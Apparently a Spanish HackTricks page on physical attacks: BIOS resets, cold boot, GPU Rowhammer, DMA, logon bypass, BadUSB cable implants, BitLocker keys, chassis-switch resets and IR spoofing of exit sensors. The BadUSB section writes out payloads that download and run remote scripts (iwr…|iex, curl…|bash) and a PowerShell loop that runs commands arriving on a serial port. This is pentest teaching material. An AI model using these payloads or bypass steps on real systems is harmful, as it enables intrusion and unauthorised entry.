# Ataques físicos

{{#include ../banners/hacktricks-training.md}}

## Recuperación de contraseñas del BIOS y seguridad del sistema

La configuración del firmware de los PC antiguos puede restablecerse desconectando la batería CMOS o utilizando un jumper documentado para borrar la CMOS. El tiempo necesario con el equipo apagado depende de la placa, y las contraseñas o claves de UEFI modernas pueden almacenarse en memoria flash no volátil, en un controlador integrado o en un dispositivo de seguridad y, por tanto, sobrevivir a la retirada de la batería. Consulta el manual de la placa o de servicio antes de poner los pines en cortocircuito; este procedimiento también puede invalidar las mediciones del TPM y activar la recuperación del cifrado del disco.

En sistemas x86 antiguos, herramientas como **killCMOS** y **CmosPwd** pueden inspeccionar o modificar la configuración respaldada por la CMOS desde un entorno de arranque. CmosPwd reconoce formatos de contraseña de un conjunto documentado de familias antiguas de BIOS y puede realizar copias de seguridad, restaurar o borrar/eliminar el estado de la CMOS; sus versiones publicadas están destinadas a entornos DOS/Windows antiguos, Linux, FreeBSD y NetBSD.<sup>[[18]](#references)</sup> Estas utilidades no son eliminadores genéricos de contraseñas de UEFI y requieren suficiente acceso al hardware y al firmware.

Algunos firmwares de portátiles muestran un código de desafío específico del fabricante después de varios intentos fallidos de contraseña. Bases de datos como [bios-pw.org](https://bios-pw.org) pueden derivar contraseñas de recuperación de fabricantes antiguos para algunos modelos, pero muchos sistemas implementan un bloqueo sin un desafío derivable. Trata cualquier contraseña generada como específica del modelo y evita agotar los contadores permanentes de intentos.

### Seguridad de UEFI

En sistemas **UEFI** modernos, CHIPSEC puede auditar las protecciones de las variables de Secure Boot. Empieza con la comprobación no modificadora siguiente; el modo opcional `-a modify` intenta deliberadamente corromper las variables y solo debe utilizarse en un sistema de laboratorio recuperable. CHIPSEC advierte que su controlador con privilegios y el acceso al hardware de bajo nivel no son adecuados para endpoints de producción.<sup>[[11]](#references)</sup>
```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```
---

## Análisis de RAM y ataques Cold Boot

La DRAM no pierde todos los bits inmediatamente cuando se detiene la actualización. La tasa de degradación varía considerablemente según la tecnología del módulo y la temperatura; el enfriamiento puede preservar datos útiles durante mucho más tiempo que un ciclo de alimentación sin enfriamiento. Un ataque Cold Boot reinicia rápidamente en un entorno de adquisición pequeño o transfiere un módulo enfriado, captura la memoria sin procesar y reconstruye claves criptográficas a pesar de la degradación de los bits. Una utilidad de copia de disco no es automáticamente un imager de memoria física, y Volatility analiza una captura en lugar de adquirirla; utiliza una herramienta de adquisición validada y apropiada para la plataforma.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer contra tablas de páginas

Los ataques modernos de GPU Rowhammer resultan mucho más útiles cuando apuntan a los **metadatos de memoria virtual de la GPU** en lugar de a buffers normales. Trabajos recientes sobre **GPU NVIDIA Ampere con GDDR6** muestran que un atacante que ejecuta código CUDA sin privilegios puede crear patrones de hammering específicos para GPU, utilizar **memory massaging** para colocar estructuras de paginación en filas vulnerables y, posteriormente, invertir bits en la **tabla de páginas de último nivel** o en un **directorio de páginas** intermedio. Una vez que se corrompe una sola entrada de traducción, el atacante puede obtener progresivamente **lectura/escritura arbitraria de memoria de la GPU** y después pivotar hacia el compromiso del host.<sup>[[1]](#references)[[2]](#references)</sup>

### Patrón de explotación

1. **Perfilar filas susceptibles de hammering** en GDDR6 y crear patrones de hammering conscientes de la actualización / no uniformes que eviten las mitigaciones integradas en la DRAM.
2. **Aplicar memory massaging a las asignaciones de GPU** para que el driver coloque las estructuras de traducción de páginas en ubicaciones físicas susceptibles de hammering, en lugar de mantenerlas en el pool protegido predeterminado. En la práctica, esto puede implicar agotar la región de tablas de páginas de memoria baja y distribuir grandes asignaciones UVM dispersas con strides controlados.
3. **Invertir metadatos de traducción**, como **PFN** o bits relacionados con el aperture, dentro de una entrada de tabla de páginas / directorio de páginas, de modo que la página virtual controlada por el atacante se resuelva hacia páginas de tablas de páginas, memoria arbitraria de la GPU o mappings del sistema visibles para el host.
4. Reutilizar el mapping falsificado para sobrescribir entradas de traducción adicionales y escalar hasta obtener **lectura/escritura arbitraria de memoria de la GPU** entre contextos de GPU.

### Pivot hacia el host y mitigaciones

- Con **IOMMU deshabilitado**, los mappings falsificados del system aperture pueden exponer memoria física arbitraria del **host** a la GPU, convirtiendo la primitiva de la GPU en un compromiso completo del host.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** apunta a entradas de tablas de páginas de último nivel, mientras que **GeForge** muestra que corromper un nivel de directorio de páginas puede ser más fácil, ya que un solo bit flip puede redirigir un subárbol de traducción más grande. No consideres únicamente una capa de paginación como crítica para la seguridad.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** sigue siendo importante porque bloquea la ruta directa hacia memoria arbitraria del host utilizada por GDDRHammer/GeForge, pero **no es una mitigación completa**. **GPUBreach** muestra un pivot de segunda fase en el que el atacante corrompe buffers de CPU controlados por la GPU y pertenecientes al driver, y después activa bugs de seguridad de memoria del driver de NVIDIA para obtener una primitiva de escritura en el kernel y una **root shell**, incluso con IOMMU habilitado.<sup>[[3]](#references)</sup>
- La **ECC a nivel de sistema** es una medida práctica de hardening en GPU de workstation/server compatibles. Las GPU de consumo sin ECC presentan una superficie de defensa más débil.<sup>[[4]](#references)</sup>
- Estos ataques no son puramente teóricos: **GeForge** informó de **1.171** bit flips en una RTX 3060 y **202** en una RTX A6000, lo que bastó para construir una cadena funcional de escalada de privilegios en el host.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Ataques de acceso directo a memoria (DMA)

**Inception** demuestra la **adquisición y modificación de memoria basada en DMA** a través de interfaces como FireWire y configuraciones antiguas de Thunderbolt, incluidos bypasses históricos de inicio de sesión. No es simplemente “ineficaz contra Windows 10”: la explotabilidad depende de la interfaz, la build objetivo, la política de IOMMU, el estado de bloqueo y de si Windows Kernel DMA Protection es compatible y está habilitado. Windows 10 versión 1803 y posteriores introdujeron Kernel DMA Protection en plataformas compatibles, modificando sustancialmente la superficie de ataque.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB para acceder al sistema

En un volumen de Windows sin cifrar o ya desbloqueado, un entorno offline puede reemplazar binarios de accesibilidad como **sethc.exe** o **Utilman.exe** por **cmd.exe**, proporcionando un command prompt de SYSTEM cuando se ejecuta el acceso directo correspondiente de la pantalla de inicio de sesión. Herramientas como **chntpw** pueden editar los datos de cuentas locales de SAM. Estos métodos no evitan un volumen BitLocker bloqueado y pueden dañar credenciales protegidas con DPAPI/EFS; conserva copias forenses y backups.

**Kon-Boot** es una herramienta comercial de bypass de autenticación en el arranque para configuraciones compatibles de Windows/macOS. La compatibilidad depende del sistema operativo, el modo del firmware, Secure Boot y la configuración del cifrado de disco; no descifra un volumen bloqueado con BitLocker.<sup>[[10]](#references)</sup>

---

## Gestión de las funciones de seguridad de Windows

### Accesos directos de arranque y recuperación

- **Delete/Supr**, F2, F10 u otra tecla del fabricante pueden abrir la configuración del firmware.
- **F8** entra en las opciones avanzadas de arranque heredadas de Windows únicamente en configuraciones donde esa ruta siga habilitada; el acceso actual a la recuperación varía.
- Mantener pulsada **Shift** puede impedir el inicio de sesión automático de Windows en algunas configuraciones, aunque la configuración de políticas o del registro puede deshabilitar ese comportamiento.<sup>[[17]](#references)</sup>

### Dispositivos BAD USB

Dispositivos como **USB Rubber Ducky** y placas Teensy pueden enumerarse como teclados HID de confianza e inyectar pulsaciones predefinidas. El payload obtiene inicialmente los privilegios y el acceso al escritorio de la sesión con la que se ha iniciado sesión; las solicitudes UAC, el bloqueo de pantalla, la distribución del teclado, el timing y la política USB del endpoint siguen limitándolo.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Los privilegios de administrador o de backup pueden crear una shadow copy o guardar registry hives para adquirir archivos bloqueados como **SAM** y **SYSTEM**. Se trata de una técnica de recopilación posterior al compromiso, no de un bypass de privilegios, y debe correlacionarse con eventos de `diskshadow`/VSS y de exportación de registry hives.

## Técnicas de implantes BadUSB / HID

### Implantes de cables gestionados por Wi-Fi

- Los implantes basados en ESP32-S3, como **Evil Crow Cable Wind**, se ocultan dentro de cables USB-A→USB-C o USB-C↔USB-C, se enumeran únicamente como un teclado USB y exponen su stack C2 mediante Wi-Fi. El operador solo necesita alimentar el cable desde el host víctima, crear un hotspot llamado `Evil Crow Cable Wind` con la contraseña `123456789` y acceder a [http://cable-wind.local/](http://cable-wind.local/) (o a su dirección DHCP) para llegar a la interfaz HTTP integrada.<sup>[[8]](#references)</sup>
- La UI del navegador proporciona pestañas para *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* y *Config*. Los payloads almacenados se etiquetan por sistema operativo, las distribuciones del teclado se cambian sobre la marcha y las cadenas VID/PID pueden modificarse para imitar periféricos conocidos.
- Como el C2 reside dentro del cable, un teléfono puede preparar payloads, activar su ejecución y gestionar las credenciales Wi-Fi sin utilizar la red de la organización, lo que resulta útil para intrusiones físicas de corta permanencia.

### Payloads AutoExec conscientes del sistema operativo

- Las reglas AutoExec vinculan uno o más payloads para que se ejecuten inmediatamente después de la enumeración USB. El implante realiza una identificación ligera del sistema operativo y selecciona el script correspondiente.
- Flujo de trabajo de ejemplo:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) o `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Como la ejecución no requiere interacción, simplemente cambiar un cable de carga puede conseguir un acceso inicial de tipo “plug-and-pwn” bajo el contexto del usuario con sesión iniciada.

### Remote shell iniciada mediante HID sobre Wi-Fi TCP

1. **Bootstrap mediante pulsaciones:** Un payload almacenado abre una consola y pega un bucle que ejecuta todo lo que llega desde el nuevo dispositivo USB serie. Una variante mínima para Windows es:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Puente de cable:** El implante mantiene abierto el canal USB CDC mientras su ESP32-S3 inicia un cliente TCP (Python script, Android APK o ejecutable de escritorio) de vuelta al operador. Cualquier byte escrito en la sesión TCP se reenvía al flujo serie anterior, lo que permite la ejecución remota de comandos incluso en hosts aislados de la red. La salida es limitada, por lo que los operadores normalmente ejecutan comandos a ciegas (creación de cuentas, preparación de herramientas adicionales, etc.).

### Superficie de actualización OTA vía HTTP

- La interfaz documentada de Evil Crow Cable Wind expone un endpoint de actualización de firmware sin autenticación en `/update`:<sup>[[8]](#references)</sup>
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Los operadores de campo pueden cambiar funciones en caliente (por ejemplo, instalar el firmware de USB Army Knife) en mitad de una operación sin abrir el cable, lo que permite que el implante cambie a nuevas capacidades mientras sigue conectado al host objetivo.

## Eludir el cifrado de BitLocker

Una adquisición forense autorizada de un sistema activo o ejecutado recientemente puede contener una clave maestra de volumen de BitLocker o material de clave relacionado mientras el volumen está desbloqueado. Herramientas comerciales como Elcomsoft Forensic Disk Decryptor y Passware Kit Forensic pueden buscar en imágenes de memoria compatibles, archivos de hibernación o volcados de memoria, pero el éxito no está garantizado. Las versiones modernas de Windows también cifran los volcados de memoria cuando BitLocker está habilitado, y una contraseña de recuperación de 48 dígitos almacenada es un artefacto diferente de una clave de volumen en memoria.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Social Engineering para añadir una clave de recuperación

Un atacante que persuada a un administrador para ejecutar comandos de administración de BitLocker puede añadir una contraseña de recuperación, una clave externa u otro protector y después capturarlo. Una contraseña de recuperación no puede ser una cadena arbitraria de ceros: las contraseñas numéricas de recuperación de BitLocker tienen un formato validado de 48 dígitos. La sintaxis de administración autorizada relevante es `manage-bde -protectors -add C: -recoverypassword`; enumera los protectores resultantes con `manage-bde -protectors -get C:`. Supervisa las adiciones de protectores y asegúrate de que el nuevo material de recuperación se almacene únicamente en ubicaciones aprobadas.<sup>[[16]](#references)</sup>

---

## Explotar los interruptores de intrusión del chasis / mantenimiento para restablecer el BIOS a los valores de fábrica

Muchos portátiles modernos y equipos de sobremesa compactos incluyen un **interruptor de intrusión del chasis** supervisado por el Embedded Controller (EC) y el firmware del BIOS/UEFI. Aunque el propósito principal del interruptor es generar una alerta cuando se abre un dispositivo, algunos proveedores implementan en ocasiones un **atajo de recuperación no documentado** que se activa cuando el interruptor se conmuta siguiendo un patrón específico.<sup>[[5]](#references)[[6]](#references)</sup>

### Cómo funciona el ataque

1. El interruptor está conectado a una **interrupción GPIO** del EC.
2. El firmware que se ejecuta en el EC realiza un seguimiento del **momento y el número de pulsaciones**.
3. Cuando se reconoce un patrón codificado, el EC invoca una rutina de *mainboard-reset* que **borra el contenido de la NVRAM/CMOS del sistema**.
4. En el siguiente arranque, los modelos afectados cargan el estado de firmware restablecido. Según el proveedor y la revisión, el estado borrado puede incluir una contraseña de supervisor, configuraciones de arranque personalizadas o claves de Secure Boot inscritas; el estado del TPM y los efectos sobre el cifrado del disco deben evaluarse por separado.

> Un restablecimiento del firmware puede restaurar las opciones de arranque externo, pero **no** descifra el almacenamiento. BitLocker u otro sistema de cifrado de disco completo puede entrar en modo de recuperación después de cambios en el TPM o el firmware y seguir protegiendo la unidad interna sin una clave de recuperación.<sup>[[16]](#references)</sup>

### Ejemplo del mundo real – portátil Framework 13

El atajo de recuperación para el Framework 13 (de 11.ª/12.ª/13.ª generación) es:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Después del décimo ciclo, el EC establece un indicador que instruye al BIOS para borrar la NVRAM en el siguiente reinicio. Todo el procedimiento tarda ~40 s y requiere **nada más que un destornillador**.<sup>[[5]](#references)</sup>

### Procedimiento genérico de explotación

1. Enciende o suspende y reanuda el objetivo para que el EC esté en ejecución.
2. Retira la cubierta inferior para dejar expuesto el interruptor de intrusión/mantenimiento.
3. Reproduce el patrón de alternancia específico del proveedor (consulta la documentación o los foros, o realiza reverse engineering del firmware del EC).
4. Vuelve a montar y reinicia; después, inspecciona qué ajustes del firmware y credenciales cambiaron realmente.
5. Si tienes autorización y el arranque externo está disponible, inicia una live image controlada. Una vez que un volumen interno esté legítimamente desbloqueado (o si nunca estuvo cifrado), el entorno live puede adquirir credenciales y datos, o inspeccionar la EFI System Partition. Modificar esa partición para instalar un EFI implant es persistente y altamente intrusivo, y sigue estando limitado por Secure Boot, measured boot, la protección contra escritura del firmware y la monitorización del endpoint. El almacenamiento cifrado sigue siendo inaccesible sin su clave o material de recuperación.

### Detección y mitigación

* Registra los eventos de intrusión del chasis en la consola de gestión del sistema operativo y correlaciónalos con reinicios inesperados del BIOS.
* Utiliza **sellos que evidencien la manipulación** en tornillos/cubiertas para detectar aperturas.
* Mantén los dispositivos en **áreas físicamente controladas**; asume que el acceso físico equivale a un compromiso total.
* Cuando esté disponible, desactiva la función del proveedor de “maintenance switch reset” o exige una autorización criptográfica adicional para los reseteos de NVRAM.

---

## Inyección IR encubierta contra sensores de salida sin contacto

### Características del sensor
- Los sensores comerciales de “wave-to-exit” combinan un emisor LED de IR cercano con un módulo receptor estilo mando a distancia de TV que solo informa un nivel lógico alto después de detectar múltiples pulsos (~4–10) de la portadora correcta (≈30 kHz).<sup>[[7]](#references)</sup>
- Una cubierta de plástico impide que el emisor y el receptor se vean directamente entre sí, por lo que el controlador asume que cualquier portadora validada procede de un reflejo cercano y activa un relé que abre el cerradero de la puerta.
- Una vez que el controlador cree que hay un objetivo presente, suele cambiar la envolvente de modulación saliente, pero el receptor sigue aceptando cualquier ráfaga que coincida con la portadora filtrada.

### Flujo de ataque
1. **Captura el perfil de emisión** – conecta un analizador lógico entre los pines del controlador para registrar tanto las formas de onda previas a la detección como las posteriores que accionan el LED IR interno.
2. **Reproduce únicamente la forma de onda “posterior a la detección”** – retira/ignora el emisor de serie y acciona un LED IR externo con el patrón ya activado desde el principio. Como al receptor solo le importan el número y la frecuencia de los pulsos, trata la portadora suplantada como un reflejo auténtico y activa la línea del relé.
3. **Controla la transmisión** – transmite la portadora en ráfagas ajustadas (por ejemplo, decenas de milisegundos encendida y un intervalo similar apagada) para proporcionar el número mínimo de pulsos sin saturar el AGC del receptor ni su lógica de gestión de interferencias. La emisión continua desensibiliza rápidamente el sensor e impide que el relé se active.

### Inyección reflectiva de largo alcance
- Sustituir el LED de laboratorio por un diodo IR de alta potencia, un driver MOSFET y óptica de enfoque permite activar el sensor de forma fiable desde ~6 m de distancia.
- El atacante no necesita línea de visión directa con la apertura del receptor; apuntar el haz hacia paredes interiores, estanterías o marcos de puertas visibles a través del cristal permite que la energía reflejada entre en el campo de visión de ~30° y simule un movimiento de mano a corta distancia.
- Como los receptores esperan únicamente reflejos débiles, un haz externo mucho más potente puede rebotar en varias superficies y seguir por encima del umbral de detección.

### Linterna de ataque weaponised
- Integrar el driver dentro de una linterna comercial oculta la herramienta a plena vista. Sustituye el LED visible por un LED IR de alta potencia adaptado a la banda del receptor, añade un ATtiny412 (o similar) para generar las ráfagas de ≈30 kHz y utiliza un MOSFET para absorber la corriente del LED.
- Una lente telescópica con zoom estrecha el haz para mejorar el alcance y la precisión, mientras que un motor de vibración controlado por el MCU proporciona confirmación háptica de que la modulación está activa sin emitir luz visible.
- Alternar entre varios patrones de modulación almacenados (con frecuencias de portadora y envolventes ligeramente diferentes) aumenta la compatibilidad entre familias de sensores renombradas, lo que permite al operador barrer superficies reflectantes hasta que el relé haga clic de forma audible y la puerta se abra.

---

## References

- [1] [GDDRHammer: Perturbación extrema de filas DRAM — ataques Rowhammer entre componentes desde GPUs modernas](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hacer hammering sobre memoria GDDR para falsificar tablas de páginas de GPU por diversión y beneficio](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Ataques de escalada de privilegios contra GPUs mediante Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Aviso de seguridad: Rowhammer - julio de 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Pulsa aquí para hacer pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Guía de reseteo de la mainboard](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “¡Noooooooo Touch! – Bypassing de sensores de salida IR sin contacto con una linterna IR encubierta”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Conecta, ejecuta y haz pwn: hacking con Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Ataque Rowhammer contra chips NVIDIA](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Documentación oficial e información de compatibilidad de Kon-Boot](https://kon-boot.com/)
- [11] [Documentación de CHIPSEC - Protecciones de variables de Secure Boot](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: ataques Cold Boot contra claves de cifrado](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - manipulación de memoria física mediante DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Documentación de Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - Guía de operaciones de BitLocker](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Comportamiento al mantener pulsada la tecla Shift y del inicio de sesión automático](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - Documentación y descargas de CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
